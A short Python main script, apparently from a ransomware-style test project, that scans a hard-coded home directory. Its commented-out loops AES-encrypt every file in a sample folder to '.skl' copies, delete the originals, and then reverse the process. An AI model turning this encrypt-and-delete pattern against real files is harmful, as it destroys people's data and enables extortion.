import os
from pathlib import Path
from src.crypto.aes import Crypto
from src.filesystem import Filesystem

def main():
    target = os.path.join(
        os.getcwd(),
        "sample"
    )

    # aes = Crypto()
    filesystem = Filesystem()
    filesystem.set_parent("/home/billal")
    filesystem.run_scan()
    
    # for (root, dirs, files) in os.walk(target):
    #     for file in files:
    #         pathjoin = os.path.join(root, file)
    #         print ('encrypt: ' + file)
    #         aes.encrypt(pathjoin, pathjoin + ".skl")
    #         os.remove(pathjoin)
    # for (root, dirs, files) in os.walk(target):
    #     for file in files:
    #         pathjoin = os.path.join(root, file)
    #         print ("decrypt: " + pathjoin)
    #         original_filename = pathjoin[:len(pathjoin)-len(".skl")]
    #         aes.decrypt(pathjoin, original_filename)
    #         os.remove(pathjoin)

if __name__ == "__main__":
    main()